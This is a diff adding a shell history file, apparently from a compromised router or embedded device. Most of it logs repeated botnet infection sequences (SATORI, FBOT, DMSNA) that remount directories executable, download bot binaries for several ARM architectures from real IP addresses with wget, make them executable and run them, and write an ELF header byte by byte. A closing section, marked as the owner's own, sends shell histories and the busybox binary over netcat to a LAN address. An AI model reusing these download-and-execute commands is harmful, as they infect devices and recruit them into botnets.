@@ -1,0 +1,446 @@
+quit
+exit
+ls
+cd /
+ls
+cd .
+cd ..
+cd fh
+ls
+cd ..
+ls dev
+ls
+history
+cd home
+ls
+cd cli
+ls
+cd voip
+ls
+cd ..
+ls
+ls chip
+ls
+ls chip/security
+cat chip/security/ip_filter_get
+ls
+cd chip
+ls
+cd /
+ls
+cd var
+ls
+cat dhcp6s.conf
+quie
+exit
+sh
+shell
+enable
+system
+/bin/busybox SATORI
+/bin/busybox cat /bin/busybox || while read i; do /bin/busybox echo $i; done < /bin/busybox || /bin/busybox dd if=/bin/busybox bs=22 count=1
+sh
+shell
+enable
+system
+/bin/busybox SATORI
+mkdir /tmp; mount -o remount,rw,exec /tmp; >/tmp/.s && cd /tmp
+mkdir /var; mount -o remount,rw,exec /var; >/var/.s && cd /var
+mkdir /dev; mount -o remount,rw,exec /dev; >/dev/.s && cd /dev
+mkdir /mnt; mount -o remount,rw,exec /mnt; >/mnt/.s && cd /mnt
+mkdir /var/run; mount -o remount,rw,exec /var/run; >/var/run/.s && cd /var/run
+mkdir /var/tmp; mount -o remount,rw,exec /var/tmp; >/var/tmp/.s && cd /var/tmp
+mkdir /; mount -o remount,rw,exec /; >//.s && cd /
+mkdir /dev/netslink; mount -o remount,rw,exec /dev/netslink; >/dev/netslink/.s && cd /dev/netslink
+mkdir /dev/shm; mount -o remount,rw,exec /dev/shm; >/dev/shm/.s && cd /dev/shm
+mkdir /bin; mount -o remount,rw,exec /bin; >/bin/.s && cd /bin
+mkdir /etc; mount -o remount,rw,exec /etc; >/etc/.s && cd /etc
+mkdir /boot; mount -o remount,rw,exec /boot; >/boot/.s && cd /boot
+mkdir /usr; mount -o remount,rw,exec /usr; >/usr/.s && cd /usr
+mkdir /sys; mount -o remount,rw,exec /sys; >/sys/.s && cd /sys
+/bin/busybox wget; /bin/busybox tftp; /bin/busybox FBOT
+/bin/busybox cp /bin/busybox .d && >.d && /bin/busybox chmod 777 .d && /bin/busybox cp /bin/busybox .b && >.b && /bin/busybox chmod 777 .b
+/bin/busybox wget http://195.62.53.96/bot.armeb -O -> .b; /bin/busybox chmod 777 .b; ./.b scan.wget.armeb; >.b
+/bin/busybox wget http://195.62.53.96/bot.arm4 -O -> .b; /bin/busybox chmod 777 .b; ./.b scan.wget.arm4; >.b
+/bin/busybox wget http://195.62.53.96/bot.arm5 -O -> .b; /bin/busybox chmod 777 .b; ./.b scan.wget.arm5; >.b
+/bin/busybox wget http://195.62.53.96/bot.arm6 -O -> .b; /bin/busybox chmod 777 .b; ./.b scan.wget.arm6; >.b
+/bin/busybox wget http://195.62.53.96/bot.arm7 -O -> .b; /bin/busybox chmod 777 .b; ./.b scan.wget.arm7; >.b
+/bin/busybox wget http://195.62.53.96/bot.aarch64 -O -> .b; /bin/busybox chmod 777 .b; ./.b scan.wget.aarch64; >.b
+/bin/busybox cp /bin/busybox .d && >.d && /bin/busybox chmod 777 .d && /bin/busybox cp /bin/busybox .b && >.b && /bin/busybox chmod 777 .b
+/bin/busybox echo -en '\x7f\x45\x4c\x46\x01\x01\x01\x61\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x28\x00\x01\x00\x00\x00\x20\x83\x00\x00\x34\x00\x00\x00\xe4\x03\x00\x00\x02\x02\x00\x00\x34\x00\x20\x00\x02\x00\x28\x00\x05\x00\x04\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x80\x00\x00' > .d && /bin/busybox echo -en '\x45\x43\x48\x4f\x44\x4f\x4e\x45'
+ls
+netstat
+ping
+help
+ls /usr/bin
+uname -a
+ls
+cd /bin
+ls
+ls | grep dd
+ls
+ps
+netstat
+fuser
+lsof
+netstat -tulpn | grep :80
+ps aux | grep webs
+whereis
+ls
+ls | grep web
+cd ..
+netstat | grep webs
+netstat
+netstat -tulpn
+ps aux | grep webs
+ps -auxwe | grep webs
+whatis webs
+history
+ls
+cd fh
+cd ../proc
+ls
+cd 1504
+ls
+pwd
+cd task
+ls
+cd 1504
+ls
+cat environ
+cd ../../
+ls
+cd ..
+ls
+cd ..
+ls
+cd home
+ls
+cd cli
+ls
+tree
+cd cfe
+ls
+cd ant
+ls
+cd ..
+ls
+cd hw
+ls
+cd ..
+ls
+cd ../../
+ls
+cd ../
+ls
+cd sbin
+ls
+cd ../bin
+ls
+man
+man webs
+find / -name "webs*"
+ps aux | grep .b
+ps aux | grep ".b"
+ps aux | grep \.b
+exit
+sh
+shell
+enable
+system
+/bin/busybox SATORI
+/bin/busybox cat /bin/busybox || while read i; do /bin/busybox echo $i; done < /bin/busybox || /bin/busybox dd if=/bin/busybox bs=22 count=1
+sh
+shell
+enable
+system
+/bin/busybox SATORI
+mkdir /tmp; mount -o remount,rw,exec /tmp; >/tmp/.s && cd /tmp
+mkdir /var; mount -o remount,rw,exec /var; >/var/.s && cd /var
+mkdir /dev; mount -o remount,rw,exec /dev; >/dev/.s && cd /dev
+mkdir /mnt; mount -o remount,rw,exec /mnt; >/mnt/.s && cd /mnt
+mkdir /var/run; mount -o remount,rw,exec /var/run; >/var/run/.s && cd /var/run
+mkdir /var/tmp; mount -o remount,rw,exec /var/tmp; >/var/tmp/.s && cd /var/tmp
+mkdir /; mount -o remount,rw,exec /; >//.s && cd /
+mkdir /dev/netslink; mount -o remount,rw,exec /dev/netslink; >/dev/netslink/.s && cd /dev/netslink
+mkdir /dev/shm; mount -o remount,rw,exec /dev/shm; >/dev/shm/.s && cd /dev/shm
+mkdir /bin; mount -o remount,rw,exec /bin; >/bin/.s && cd /bin
+mkdir /etc; mount -o remount,rw,exec /etc; >/etc/.s && cd /etc
+mkdir /boot; mount -o remount,rw,exec /boot; >/boot/.s && cd /boot
+mkdir /usr; mount -o remount,rw,exec /usr; >/usr/.s && cd /usr
+mkdir /sys; mount -o remount,rw,exec /sys; >/sys/.s && cd /sys
+/bin/busybox wget; /bin/busybox tftp; /bin/busybox FBOT
+/bin/busybox cp /bin/busybox .d && >.d && /bin/busybox chmod 777 .d && /bin/busybox cp /bin/busybox .b && >.b && /bin/busybox chmod 777 .b
+/bin/busybox wget http://195.62.53.96/bot.armeb -O -> .b; /bin/busybox chmod 777 .b; ./.b scan.wget.armeb; >.b
+/bin/busybox wget http://195.62.53.96/bot.arm4 -O -> .b; /bin/busybox chmod 777 .b; ./.b scan.wget.arm4; >.b
+/bin/busybox wget http://195.62.53.96/bot.arm5 -O -> .b; /bin/busybox chmod 777 .b; ./.b scan.wget.arm5; >.b
+/bin/busybox wget http://195.62.53.96/bot.arm6 -O -> .b; /bin/busybox chmod 777 .b; ./.b scan.wget.arm6; >.b
+/bin/busybox wget http://195.62.53.96/bot.arm7 -O -> .b; /bin/busybox chmod 777 .b; ./.b scan.wget.arm7; >.b
+/bin/busybox wget http://195.62.53.96/bot.aarch64 -O -> .b; /bin/busybox chmod 777 .b; ./.b scan.wget.aarch64; >.b
+/bin/busybox cp /bin/busybox .d && >.d && /bin/busybox chmod 777 .d && /bin/busybox cp /bin/busybox .b && >.b && /bin/busybox chmod 777 .b
+/bin/busybox echo -en '\x7f\x45\x4c\x46\x01\x01\x01\x61\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x28\x00\x01\x00\x00\x00\x20\x83\x00\x00\x34\x00\x00\x00\xe4\x03\x00\x00\x02\x02\x00\x00\x34\x00\x20\x00\x02\x00\x28\x00\x05\x00\x04\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x80\x00\x00' > .d && /bin/busybox echo -en '\x45\x43\x48\x4f\x44\x4f\x4e\x45'
+sh
+shell
+enable
+system
+/bin/busybox SATORI
+/bin/busybox cat /bin/busybox || while read i; do /bin/busybox echo $i; done < /bin/busybox || /bin/busybox dd if=/bin/busybox bs=22 count=1
+sh
+shell
+enable
+system
+/bin/busybox SATORI
+mkdir /tmp; mount -o remount,rw,exec /tmp; >/tmp/.s && cd /tmp
+mkdir /var; mount -o remount,rw,exec /var; >/var/.s && cd /var
+mkdir /dev; mount -o remount,rw,exec /dev; >/dev/.s && cd /dev
+mkdir /mnt; mount -o remount,rw,exec /mnt; >/mnt/.s && cd /mnt
+mkdir /var/run; mount -o remount,rw,exec /var/run; >/var/run/.s && cd /var/run
+mkdir /var/tmp; mount -o remount,rw,exec /var/tmp; >/var/tmp/.s && cd /var/tmp
+mkdir /; mount -o remount,rw,exec /; >//.s && cd /
+mkdir /dev/netslink; mount -o remount,rw,exec /dev/netslink; >/dev/netslink/.s && cd /dev/netslink
+mkdir /dev/shm; mount -o remount,rw,exec /dev/shm; >/dev/shm/.s && cd /dev/shm
+mkdir /bin; mount -o remount,rw,exec /bin; >/bin/.s && cd /bin
+mkdir /etc; mount -o remount,rw,exec /etc; >/etc/.s && cd /etc
+mkdir /boot; mount -o remount,rw,exec /boot; >/boot/.s && cd /boot
+mkdir /usr; mount -o remount,rw,exec /usr; >/usr/.s && cd /usr
+mkdir /sys; mount -o remount,rw,exec /sys; >/sys/.s && cd /sys
+/bin/busybox wget; /bin/busybox tftp; /bin/busybox FBOT
+/bin/busybox cp /bin/busybox .d && >.d && /bin/busybox chmod 777 .d && /bin/busybox cp /bin/busybox .b && >.b && /bin/busybox chmod 777 .b
+/bin/busybox wget http://195.62.53.96/bot.armeb -O -> .b; /bin/busybox chmod 777 .b; ./.b scan.wget.armeb; >.b
+/bin/busybox wget http://195.62.53.96/bot.arm4 -O -> .b; /bin/busybox chmod 777 .b; ./.b scan.wget.arm4; >.b
+/bin/busybox wget http://195.62.53.96/bot.arm5 -O -> .b; /bin/busybox chmod 777 .b; ./.b scan.wget.arm5; >.b
+/bin/busybox wget http://195.62.53.96/bot.arm6 -O -> .b; /bin/busybox chmod 777 .b; ./.b scan.wget.arm6; >.b
+/bin/busybox wget http://195.62.53.96/bot.arm7 -O -> .b; /bin/busybox chmod 777 .b; ./.b scan.wget.arm7; >.b
+/bin/busybox wget http://195.62.53.96/bot.aarch64 -O -> .b; /bin/busybox chmod 777 .b; ./.b scan.wget.aarch64; >.b
+/bin/busybox cp /bin/busybox .d && >.d && /bin/busybox chmod 777 .d && /bin/busybox cp /bin/busybox .b && >.b && /bin/busybox chmod 777 .b
+/bin/busybox echo -en '\x7f\x45\x4c\x46\x01\x01\x01\x61\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x28\x00\x01\x00\x00\x00\x20\x83\x00\x00\x34\x00\x00\x00\xe4\x03\x00\x00\x02\x02\x00\x00\x34\x00\x20\x00\x02\x00\x28\x00\x05\x00\x04\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x80\x00\x00' > .d && /bin/busybox echo -en '\x45\x43\x48\x4f\x44\x4f\x4e\x45'
+sh
+shell
+enable
+system
+/bin/busybox SATORI
+/bin/busybox cat /bin/busybox || while read i; do /bin/busybox echo $i; done < /bin/busybox || /bin/busybox dd if=/bin/busybox bs=22 count=1
+sh
+shell
+enable
+system
+/bin/busybox SATORI
+mkdir /tmp; mount -o remount,rw,exec /tmp; >/tmp/.s && cd /tmp
+mkdir /var; mount -o remount,rw,exec /var; >/var/.s && cd /var
+mkdir /dev; mount -o remount,rw,exec /dev; >/dev/.s && cd /dev
+mkdir /mnt; mount -o remount,rw,exec /mnt; >/mnt/.s && cd /mnt
+mkdir /var/run; mount -o remount,rw,exec /var/run; >/var/run/.s && cd /var/run
+mkdir /var/tmp; mount -o remount,rw,exec /var/tmp; >/var/tmp/.s && cd /var/tmp
+mkdir /; mount -o remount,rw,exec /; >//.s && cd /
+mkdir /dev/netslink; mount -o remount,rw,exec /dev/netslink; >/dev/netslink/.s && cd /dev/netslink
+mkdir /dev/shm; mount -o remount,rw,exec /dev/shm; >/dev/shm/.s && cd /dev/shm
+mkdir /bin; mount -o remount,rw,exec /bin; >/bin/.s && cd /bin
+mkdir /etc; mount -o remount,rw,exec /etc; >/etc/.s && cd /etc
+mkdir /boot; mount -o remount,rw,exec /boot; >/boot/.s && cd /boot
+mkdir /usr; mount -o remount,rw,exec /usr; >/usr/.s && cd /usr
+mkdir /sys; mount -o remount,rw,exec /sys; >/sys/.s && cd /sys
+/bin/busybox wget; /bin/busybox tftp; /bin/busybox FBOT
+/bin/busybox cp /bin/busybox .d && >.d && /bin/busybox chmod 777 .d && /bin/busybox cp /bin/busybox .b && >.b && /bin/busybox chmod 777 .b
+/bin/busybox wget http://195.62.53.96/bot.armeb -O -> .b; /bin/busybox chmod 777 .b; ./.b scan.wget.armeb; >.b
+/bin/busybox wget http://195.62.53.96/bot.arm4 -O -> .b; /bin/busybox chmod 777 .b; ./.b scan.wget.arm4; >.b
+/bin/busybox wget http://195.62.53.96/bot.arm5 -O -> .b; /bin/busybox chmod 777 .b; ./.b scan.wget.arm5; >.b
+/bin/busybox wget http://195.62.53.96/bot.arm6 -O -> .b; /bin/busybox chmod 777 .b; ./.b scan.wget.arm6; >.b
+/bin/busybox wget http://195.62.53.96/bot.arm7 -O -> .b; /bin/busybox chmod 777 .b; ./.b scan.wget.arm7; >.b
+/bin/busybox wget http://195.62.53.96/bot.aarch64 -O -> .b; /bin/busybox chmod 777 .b; ./.b scan.wget.aarch64; >.b
+/bin/busybox cp /bin/busybox .d && >.d && /bin/busybox chmod 777 .d && /bin/busybox cp /bin/busybox .b && >.b && /bin/busybox chmod 777 .b
+/bin/busybox echo -en '\x7f\x45\x4c\x46\x01\x01\x01\x61\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x28\x00\x01\x00\x00\x00\x20\x83\x00\x00\x34\x00\x00\x00\xe4\x03\x00\x00\x02\x02\x00\x00\x34\x00\x20\x00\x02\x00\x28\x00\x05\x00\x04\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x80\x00\x00' > .d && /bin/busybox echo -en '\x45\x43\x48\x4f\x44\x4f\x4e\x45'
+sh
+shell
+enable
+system
+/bin/busybox SATORI
+/bin/busybox cat /bin/busybox || while read i; do /bin/busybox echo $i; done < /bin/busybox || /bin/busybox dd if=/bin/busybox bs=22 count=1
+sh
+shell
+enable
+system
+/bin/busybox SATORI
+mkdir /tmp; mount -o remount,rw,exec /tmp; >/tmp/.s && cd /tmp
+mkdir /var; mount -o remount,rw,exec /var; >/var/.s && cd /var
+mkdir /dev; mount -o remount,rw,exec /dev; >/dev/.s && cd /dev
+mkdir /mnt; mount -o remount,rw,exec /mnt; >/mnt/.s && cd /mnt
+mkdir /var/run; mount -o remount,rw,exec /var/run; >/var/run/.s && cd /var/run
+mkdir /var/tmp; mount -o remount,rw,exec /var/tmp; >/var/tmp/.s && cd /var/tmp
+mkdir /; mount -o remount,rw,exec /; >//.s && cd /
+mkdir /dev/netslink; mount -o remount,rw,exec /dev/netslink; >/dev/netslink/.s && cd /dev/netslink
+mkdir /dev/shm; mount -o remount,rw,exec /dev/shm; >/dev/shm/.s && cd /dev/shm
+mkdir /bin; mount -o remount,rw,exec /bin; >/bin/.s && cd /bin
+mkdir /etc; mount -o remount,rw,exec /etc; >/etc/.s && cd /etc
+mkdir /boot; mount -o remount,rw,exec /boot; >/boot/.s && cd /boot
+mkdir /usr; mount -o remount,rw,exec /usr; >/usr/.s && cd /usr
+mkdir /sys; mount -o remount,rw,exec /sys; >/sys/.s && cd /sys
+/bin/busybox wget; /bin/busybox tftp; /bin/busybox FBOT
+/bin/busybox cp /bin/busybox .d && >.d && /bin/busybox chmod 777 .d && /bin/busybox cp /bin/busybox .b && >.b && /bin/busybox chmod 777 .b
+/bin/busybox wget http://195.62.53.96/bot.armeb -O -> .b; /bin/busybox chmod 777 .b; ./.b scan.wget.armeb; >.b
+/bin/busybox wget http://195.62.53.96/bot.arm4 -O -> .b; /bin/busybox chmod 777 .b; ./.b scan.wget.arm4; >.b
+sh
+shell
+enable
+system
+/bin/busybox SATORI
+/bin/busybox cat /bin/busybox || while read i; do /bin/busybox echo $i; done < /bin/busybox || /bin/busybox dd if=/bin/busybox bs=22 count=1
+sh
+shell
+enable
+system
+/bin/busybox SATORI
+mkdir /tmp; mount -o remount,rw,exec /tmp; >/tmp/.s && cd /tmp
+mkdir /var; mount -o remount,rw,exec /var; >/var/.s && cd /var
+mkdir /dev; mount -o remount,rw,exec /dev; >/dev/.s && cd /dev
+mkdir /mnt; mount -o remount,rw,exec /mnt; >/mnt/.s && cd /mnt
+mkdir /var/run; mount -o remount,rw,exec /var/run; >/var/run/.s && cd /var/run
+mkdir /var/tmp; mount -o remount,rw,exec /var/tmp; >/var/tmp/.s && cd /var/tmp
+mkdir /; mount -o remount,rw,exec /; >//.s && cd /
+mkdir /dev/netslink; mount -o remount,rw,exec /dev/netslink; >/dev/netslink/.s && cd /dev/netslink
+mkdir /dev/shm; mount -o remount,rw,exec /dev/shm; >/dev/shm/.s && cd /dev/shm
+mkdir /bin; mount -o remount,rw,exec /bin; >/bin/.s && cd /bin
+mkdir /etc; mount -o remount,rw,exec /etc; >/etc/.s && cd /etc
+mkdir /boot; mount -o remount,rw,exec /boot; >/boot/.s && cd /boot
+mkdir /usr; mount -o remount,rw,exec /usr; >/usr/.s && cd /usr
+mkdir /sys; mount -o remount,rw,exec /sys; >/sys/.s && cd /sys
+/bin/busybox wget; /bin/busybox tftp; /bin/busybox FBOT
+/bin/busybox cp /bin/busybox .d && >.d && /bin/busybox chmod 777 .d && /bin/busybox cp /bin/busybox .b && >.b && /bin/busybox chmod 777 .b
+/bin/busybox wget http://195.62.53.96/bot.armeb -O -> .b; /bin/busybox chmod 777 .b; ./.b scan.wget.armeb; >.b
+/bin/busybox wget http://195.62.53.96/bot.arm4 -O -> .b; /bin/busybox chmod 777 .b; ./.b scan.wget.arm4; >.b
+/bin/busybox wget http://195.62.53.96/bot.arm5 -O -> .b; /bin/busybox chmod 777 .b; ./.b scan.wget.arm5; >.b
+/bin/busybox wget http://195.62.53.96/bot.arm6 -O -> .b; /bin/busybox chmod 777 .b; ./.b scan.wget.arm6; >.b
+/bin/busybox wget http://195.62.53.96/bot.arm7 -O -> .b; /bin/busybox chmod 777 .b; ./.b scan.wget.arm7; >.b
+/bin/busybox wget http://195.62.53.96/bot.aarch64 -O -> .b; /bin/busybox chmod 777 .b; ./.b scan.wget.aarch64; >.b
+/bin/busybox cp /bin/busybox .d && >.d && /bin/busybox chmod 777 .d && /bin/busybox cp /bin/busybox .b && >.b && /bin/busybox chmod 777 .b
+/bin/busybox echo -en '\x7f\x45\x4c\x46\x01\x01\x01\x61\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x28\x00\x01\x00\x00\x00\x20\x83\x00\x00\x34\x00\x00\x00\xe4\x03\x00\x00\x02\x02\x00\x00\x34\x00\x20\x00\x02\x00\x28\x00\x05\x00\x04\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x80\x00\x00' > .d && /bin/busybox echo -en '\x45\x43\x48\x4f\x44\x4f\x4e\x45'
+sh
+shell
+enable
+system
+/bin/busybox SATORI
+/bin/busybox cat /bin/busybox || while read i; do /bin/busybox echo $i; done < /bin/busybox || /bin/busybox dd if=/bin/busybox bs=22 count=1
+sh
+shell
+enable
+system
+/bin/busybox SATORI
+mkdir /tmp; mount -o remount,rw,exec /tmp; >/tmp/.s && cd /tmp
+mkdir /var; mount -o remount,rw,exec /var; >/var/.s && cd /var
+mkdir /dev; mount -o remount,rw,exec /dev; >/dev/.s && cd /dev
+mkdir /mnt; mount -o remount,rw,exec /mnt; >/mnt/.s && cd /mnt
+mkdir /var/run; mount -o remount,rw,exec /var/run; >/var/run/.s && cd /var/run
+mkdir /var/tmp; mount -o remount,rw,exec /var/tmp; >/var/tmp/.s && cd /var/tmp
+mkdir /; mount -o remount,rw,exec /; >//.s && cd /
+mkdir /dev/netslink; mount -o remount,rw,exec /dev/netslink; >/dev/netslink/.s && cd /dev/netslink
+mkdir /dev/shm; mount -o remount,rw,exec /dev/shm; >/dev/shm/.s && cd /dev/shm
+mkdir /bin; mount -o remount,rw,exec /bin; >/bin/.s && cd /bin
+mkdir /etc; mount -o remount,rw,exec /etc; >/etc/.s && cd /etc
+mkdir /boot; mount -o remount,rw,exec /boot; >/boot/.s && cd /boot
+mkdir /usr; mount -o remount,rw,exec /usr; >/usr/.s && cd /usr
+mkdir /sys; mount -o remount,rw,exec /sys; >/sys/.s && cd /sys
+/bin/busybox wget; /bin/busybox tftp; /bin/busybox FBOT
+/bin/busybox cp /bin/busybox .d && >.d && /bin/busybox chmod 777 .d && /bin/busybox cp /bin/busybox .b && >.b && /bin/busybox chmod 777 .b
+/bin/busybox wget http://195.62.53.96/bot.armeb -O -> .b; /bin/busybox chmod 777 .b; ./.b scan.wget.armeb; >.b
+/bin/busybox wget http://195.62.53.96/bot.arm4 -O -> .b; /bin/busybox chmod 777 .b; ./.b scan.wget.arm4; >.b
+/bin/busybox wget http://195.62.53.96/bot.arm5 -O -> .b; /bin/busybox chmod 777 .b; ./.b scan.wget.arm5; >.b
+/bin/busybox wget http://195.62.53.96/bot.arm6 -O -> .b; /bin/busybox chmod 777 .b; ./.b scan.wget.arm6; >.b
+/bin/busybox wget http://195.62.53.96/bot.arm7 -O -> .b; /bin/busybox chmod 777 .b; ./.b scan.wget.arm7; >.b
+/bin/busybox wget http://195.62.53.96/bot.aarch64 -O -> .b; /bin/busybox chmod 777 .b; ./.b scan.wget.aarch64; >.b
+/bin/busybox cp /bin/busybox .d && >.d && /bin/busybox chmod 777 .d && /bin/busybox cp /bin/busybox .b && >.b && /bin/busybox chmod 777 .b
+/bin/busybox echo -en '\x7f\x45\x4c\x46\x01\x01\x01\x61\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x28\x00\x01\x00\x00\x00\x20\x83\x00\x00\x34\x00\x00\x00\xe4\x03\x00\x00\x02\x02\x00\x00\x34\x00\x20\x00\x02\x00\x28\x00\x05\x00\x04\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x80\x00\x00' > .d && /bin/busybox echo -en '\x45\x43\x48\x4f\x44\x4f\x4e\x45'
+sh
+shell
+enable
+system
+/bin/busybox SATORI
+/bin/busybox cat /bin/busybox || while read i; do /bin/busybox echo $i; done < /bin/busybox || /bin/busybox dd if=/bin/busybox bs=22 count=1
+sh
+shell
+enable
+system
+/bin/busybox SATORI
+mkdir /tmp; mount -o remount,rw,exec /tmp; >/tmp/.s && cd /tmp
+mkdir /var; mount -o remount,rw,exec /var; >/var/.s && cd /var
+mkdir /dev; mount -o remount,rw,exec /dev; >/dev/.s && cd /dev
+mkdir /mnt; mount -o remount,rw,exec /mnt; >/mnt/.s && cd /mnt
+mkdir /var/run; mount -o remount,rw,exec /var/run; >/var/run/.s && cd /var/run
+mkdir /var/tmp; mount -o remount,rw,exec /var/tmp; >/var/tmp/.s && cd /var/tmp
+mkdir /; mount -o remount,rw,exec /; >//.s && cd /
+mkdir /dev/netslink; mount -o remount,rw,exec /dev/netslink; >/dev/netslink/.s && cd /dev/netslink
+mkdir /dev/shm; mount -o remount,rw,exec /dev/shm; >/dev/shm/.s && cd /dev/shm
+mkdir /bin; mount -o remount,rw,exec /bin; >/bin/.s && cd /bin
+mkdir /etc; mount -o remount,rw,exec /etc; >/etc/.s && cd /etc
+mkdir /boot; mount -o remount,rw,exec /boot; >/boot/.s && cd /boot
+mkdir /usr; mount -o remount,rw,exec /usr; >/usr/.s && cd /usr
+mkdir /sys; mount -o remount,rw,exec /sys; >/sys/.s && cd /sys
+/bin/busybox wget; /bin/busybox tftp; /bin/busybox FBOT
+/bin/busybox cp /bin/busybox .d && >.d && /bin/busybox chmod 777 .d && /bin/busybox cp /bin/busybox .b && >.b && /bin/busybox chmod 777 .b
+/bin/busybox wget http://195.62.53.96/bot.armeb -O -> .b; /bin/busybox chmod 777 .b; ./.b scan.wget.armeb; >.b
+/bin/busybox wget http://195.62.53.96/bot.arm4 -O -> .b; /bin/busybox chmod 777 .b; ./.b scan.wget.arm4; >.b
+/bin/busybox wget http://195.62.53.96/bot.arm5 -O -> .b; /bin/busybox chmod 777 .b; ./.b scan.wget.arm5; >.b
+/bin/busybox wget http://195.62.53.96/bot.arm6 -O -> .b; /bin/busybox chmod 777 .b; ./.b scan.wget.arm6; >.b
+/bin/busybox wget http://195.62.53.96/bot.arm7 -O -> .b; /bin/busybox chmod 777 .b; ./.b scan.wget.arm7; >.b
+/bin/busybox wget http://195.62.53.96/bot.aarch64 -O -> .b; /bin/busybox chmod 777 .b; ./.b scan.wget.aarch64; >.b
+/bin/busybox cp /bin/busybox .d && >.d && /bin/busybox chmod 777 .d && /bin/busybox cp /bin/busybox .b && >.b && /bin/busybox chmod 777 .b
+/bin/busybox echo -en '\x7f\x45\x4c\x46\x01\x01\x01\x61\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x28\x00\x01\x00\x00\x00\x20\x83\x00\x00\x34\x00\x00\x00\xe4\x03\x00\x00\x02\x02\x00\x00\x34\x00\x20\x00\x02\x00\x28\x00\x05\x00\x04\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x80\x00\x00' > .d && /bin/busybox echo -en '\x45\x43\x48\x4f\x44\x4f\x4e\x45'
+enable
+system
+shell
+sh
+/bin/busybox SATORI
+/bin/busybox cat /bin/busybox || while read i; do /bin/busybox echo ; done < /bin/busybox || /bin/busybox dd if=/bin/busybox bs=22 count=1
+enable
+system
+shell
+sh
+/bin/busybox DMSNA
+/bin/busybox mkdir /tmp/; >/tmp/.file && cd /tmp/
+/bin/busybox rm -rf .file .z .x
+/bin/busybox mkdir /var/; >/var/.file && cd /var/
+/bin/busybox rm -rf .file .z .x
+/bin/busybox mkdir /dev/; >/dev/.file && cd /dev/
+/bin/busybox rm -rf .file .z .x
+/bin/busybox mkdir /mnt/; >/mnt/.file && cd /mnt/
+/bin/busybox rm -rf .file .z .x
+/bin/busybox mkdir /var/run/; >/var/run/.file && cd /var/run/
+/bin/busybox rm -rf .file .z .x
+/bin/busybox mkdir /var/tmp/; >/var/tmp/.file && cd /var/tmp/
+/bin/busybox rm -rf .file .z .x
+/bin/busybox mkdir /; >/.file && cd /
+/bin/busybox rm -rf .file .z .x
+/bin/busybox mkdir /dev/netslink/; >/dev/netslink/.file && cd /dev/netslink/
+/bin/busybox rm -rf .file .z .x
+/bin/busybox mkdir /dev/shm/; >/dev/shm/.file && cd /dev/shm/
+/bin/busybox rm -rf .file .z .x
+/bin/busybox mkdir /bin/; >/bin/.file && cd /bin/
+/bin/busybox rm -rf .file .z .x
+/bin/busybox mkdir /etc/; >/etc/.file && cd /etc/
+/bin/busybox rm -rf .file .z .x
+/bin/busybox mkdir /boot/; >/boot/.file && cd /boot/
+/bin/busybox rm -rf .file .z .x
+/bin/busybox mkdir /usr/; >/usr/.file && cd /usr/
+/bin/busybox rm -rf .file .z .x
+/bin/busybox mkdir /sys/; >/sys/.file && cd /sys/
+/bin/busybox rm -rf .file .z .x
+/bin/busybox wget; /bin/busybox tftp; /bin/busybox HGYQA
+/bin/busybox cp /bin/busybox .z; >.z; /bin/busybox chmod 777 .z
+/bin/busybox wget http://141.98.119.27:80/batkek/arm -O -> .z; /bin/busybox chmod 777 .z; ./.z telnet.arm.wget; >.z
+/bin/busybox wget http://141.98.119.27:80/batkek/arm7 -O -> .z; /bin/busybox chmod 777 .z; ./.z telnet.arm7.wget; >.z
+
+
+((THESE ARE MINE))
+fdisk -l
+exit
+ifconfig
+nc -h # me
+history | nc 192.168.1.18 9090
+history
+ls
+cd ~
+cat .bash_history | nc 192.168.1.18 9090
+ls -a
+cat .ash_history | nc 192.168.1.18 9090
+nc 192.168.1.18 9090 < /bin/busybox
+ps aux
+ps aux | nc 192.168.1.18 9090
+cat .ash_history | nc 192.168.1.18 9090
